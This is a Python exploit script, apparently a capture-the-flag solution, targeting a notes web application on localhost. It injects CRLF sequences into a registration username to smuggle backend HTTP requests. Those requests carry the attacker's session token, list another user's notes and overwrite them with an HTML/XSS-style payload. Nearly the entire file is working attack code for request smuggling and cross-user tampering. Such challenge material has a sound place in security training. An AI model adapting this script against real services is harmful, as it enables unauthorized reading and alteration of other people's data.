import requests
import re
import secrets
import json

# CHAIN 

# leak note id
    # Edit note id of other user thru smugglig

class Challenge:

    def __init__(self, host) -> None:
        self.url = 'http://' + host
        self.sess = requests.Session()

    
    def register(self, username):
        PATH = '/register.php'

        # Retrieve CSRF token
        resp = self.sess.get(self.url + PATH)
        self.csrf = resp.cookies['csrf']

        

        data = {
            'username': username,
            'csrf': self.csrf
        }

        resp = self.sess.post(self.url + PATH, data=data).text

        # self.password = re.findall(r'password is \'(*.)\'\<\/div\>', resp)[0]
        self.username = username

    def edit(self, id, title, body):
        PATH = '/edit.php?id=' + id

        data = {
            'title': title,
            'body': body,
            'csrf': self.csrf
        }

        return self.sess.post(self.url + PATH, data=data).text
    
    def view(self, id):
        PATH = '/view.php?id=' + id

        return self.sess.get(self.url + PATH)




def smuggled_list(url, id, username, token):
    payload = '''{buster}
Host: notes
Connection: keep-alive
Authentication: {username} {token}


GET /view/{id} HTTP/1.1
Host: notesa
foo: bar
Authentication: {username} {token}
foo: bar
'''.format(id=id, buster=secrets.token_urlsafe(6), token=token, username=username).replace('\n', '\r\n')
        
    chall = Challenge(url)
    chall.register(payload)
    resp =  chall.view('1').text
    print(resp)
    regex = r'({&quot;note.*)'
    json_str = re.findall(regex, resp, re.MULTILINE)[0].replace('&quot;', '"')
    return json.loads(json_str)['note']['notes']


def smuggled_edit(url, id, username, token, body, title):
    data = {
        'title': title,
        'body': body
    }

    json_data = json.dumps(data)
    body_length = len(json_data)

    payload = '''{buster}
Host: notes
Connection: keep-alive
Authentication: {username} {token}


POST /edit/{id} HTTP/1.1
Host: notesa
foo: bar
Authentication: {username} {token}
Content-Type: application/json
Content-Length: {body_length}
foo: bar

{json_data}
'''.format(id=id, username=username, token=token, buster=secrets.token_urlsafe(8), body_length=body_length, json_data=json_data).replace('\n', '\r\n')
    chall = Challenge(url)
    chall.register(payload)
    resp =  chall.view('1').text
    print(resp)
        

if __name__ == '__main__':

    URL = 'localhost:5001'
    target_user = 'dsaasd'
    XSS_PAYLOAD = ''''<b>SMUGGLATO</b>
'''

    chall = Challenge(URL)
    chall.register(secrets.token_urlsafe(8))
    print(chall.edit(target_user, 'foo', 'bar'))

    notes = smuggled_list(URL, target_user, chall.username, chall.sess.cookies.get('session'))
    print(notes[0])

    # Edit target user list to then retrieve it
    smuggled_edit(URL, notes[0], chall.username, chall.sess.cookies.get('session'), XSS_PAYLOAD, 'SMUGGLATO')






